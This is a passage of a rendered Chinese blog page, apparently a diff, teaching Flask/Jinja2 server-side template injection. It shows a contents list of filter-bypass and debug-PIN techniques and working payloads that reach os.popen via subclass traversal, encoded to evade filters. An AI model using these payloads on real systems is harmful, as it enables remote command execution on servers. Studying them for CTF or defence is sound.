href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">绕过过滤双大括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEssti"><span class="toc-text">无回显ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="toc-text">纯盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-text">写入静态文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">getitem绕过中括号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">__getitem__()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E8%BF%87%E6%BB%A4-%E4%BE%8B%E9%A2%98"><span class="toc-text">WAF过滤[]例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">request绕过单双引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤器绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">flask常用过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attr%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">attr绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8request%E6%96%B9%E6%B3%95"><span class="toc-text">1.使用request方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8unicode%E7%BC%96%E7%A0%81"><span class="toc-text">2、使用unicode编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E6%88%96%E8%80%85%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-text">3、使用十六进制编码或者八进制编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81"><span class="toc-text">4、使用base64编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">5、格式化字符串</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%82%B9%E8%BF%87%E6%BB%A4"><span class="toc-text">中括号绕过点过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">“+”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinjia2%E4%B8%AD%E7%9A%84%E2%80%9D-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">jinjia2中的”~”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8-1"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8python%E7%9A%84char"><span class="toc-text">利用python的char()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Length%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">Length过滤器绕过数字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96config%E6%96%87%E4%BB%B6"><span class="toc-text">获取config文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#current-app"><span class="toc-text">current_app</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-text">混合过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dict-%E5%92%8Cjoin"><span class="toc-text">dict()和join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7"><span class="toc-text">获取符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%901"><span class="toc-text">实例解析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%902%EF%BC%88WAF%E8%BF%87%E6%BB%A4%E2%80%99%E2%80%99%E2%80%99%EF%BC%8C%E2%80%99%E2%80%9D%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%89"><span class="toc-text">实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A8%A1%E7%89%88"><span class="toc-text">其他模版</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado"><span class="toc-text">tornado</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-debug-pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="toc-text">python debug pin码计算</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81"><span class="toc-text">pin码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-text">pin码生成原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8Dusername"><span class="toc-text">1、获取用户名username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%8E%B7%E5%8F%96app%E5%AF%B9%E8%B1%A1name%E5%B1%9E%E6%80%A7"><span class="toc-text">2、获取app对象name属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96app%E5%AF%B9%E8%B1%A1module%E5%B1%9E%E6%80%A7"><span class="toc-text">3、获取app对象module属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81mod%E7%9A%84-file-%E5%B1%9E%E6%80%A7"><span class="toc-text">4、mod的__file__属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81uuid"><span class="toc-text">5、uuid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81get-machine-id%E8%8E%B7%E5%8F%96"><span class="toc-text">6、get_machine_id获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E7%94%9F%E6%88%90%E5%85%AD%E5%8F%82%E6%95%B0"><span class="toc-text">pin码生成六参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E8%AE%A1%E7%AE%97%E4%BE%8B%E9%A2%98"><span class="toc-text">pin码计算例题</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1701,7 +1828,7 @@
 <hr>
 <h4 id="2、使用unicode编码"><a href="#2、使用unicode编码" class="headerlink" title="2、使用unicode编码"></a>2、使用unicode编码</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;__class__&quot;</span>)|attr(<span class="hljs-name">&quot;__base__&quot;</span>)|attr(<span class="hljs-name">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;__init__&quot;</span>)|attr(<span class="hljs-name">&quot;__globals__&quot;</span>)|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml">															</span><br></code></pre></td></tr></table></figure>
 
-<h4 id="3、使用十六进制编码"><a href="#3、使用十六进制编码" class="headerlink" title="3、使用十六进制编码"></a>3、使用十六进制编码</h4><p>把下划线都用\x5f来代替</p>
+<h4 id="3、使用十六进制编码或者八进制编码"><a href="#3、使用十六进制编码或者八进制编码" class="headerlink" title="3、使用十六进制编码或者八进制编码"></a>3、使用十六进制编码或者八进制编码</h4><p>把下划线都用\x5f来代替</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">code=&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="hljs-selector-attr">[199]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <h4 id="4、使用base64编码"><a href="#4、使用base64编码" class="headerlink" title="4、使用base64编码"></a>4、使用base64编码</h4><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-12.png"></p>
